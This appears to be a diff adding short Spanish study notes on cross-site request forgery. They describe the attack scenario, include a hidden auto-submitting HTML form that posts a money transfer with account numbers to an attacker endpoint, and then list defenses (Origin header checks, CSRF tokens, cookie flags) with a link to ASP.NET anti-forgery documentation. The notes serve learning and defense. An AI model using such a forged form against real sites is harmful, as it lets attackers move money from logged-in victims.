@@ -1,0 +1,29 @@
+Level(5)
+XSS(Level(10))
+
+1. Confiar en el usuario
+2. El atancante conoce la app donde la victima esta logeado
+3. url en un email
+        img
+
+        <form style="display:none" method="POST" action="https://victima/trasferencia">
+
+        <form style="display:none" method="POST" action="https://malicioso/quitardinero">
+            <input type="hidden" name="ccc" value="2342314214323423"/>
+            <input type="hidden" name="ccc-origen" value="2342314214323421"/>
+            <input type="hidden" name="import" value="300"/>
+        </form>
+
+        <script>
+            document.forms[0].submit()
+        </script>
+
+4. Solucion 
+    comprobar en el servidor la cabecera origin
+        vistima.com->no aceptar la peticion
+    en el formario una vez que lo generas desde el servidor
+    escribir un csrf token
+        <input type="hidden" name="csrd" value="fadfasdfsfafasd">
+        cookie->secure,httponly->llave->dfadsasdfsdfasdfasdf
+
+        https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-8.0
